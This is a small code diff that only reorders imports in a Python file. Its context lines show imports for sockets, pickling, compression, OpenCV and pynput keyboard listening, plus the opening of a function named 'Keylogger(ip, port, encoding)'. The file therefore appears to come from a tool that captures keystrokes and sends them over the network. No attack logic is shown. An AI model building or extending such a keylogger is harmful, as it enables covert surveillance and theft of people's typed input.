@@ -2,9 +2,10 @@ import socket
 import pickle
 import zlib
 import cv2
+
 from pynput.keyboard import Key, Listener
-from sys import exit
 from Specific.encrypt import Encryption
+from sys import exit
 
 
 def Keylogger(ip, port, encoding):
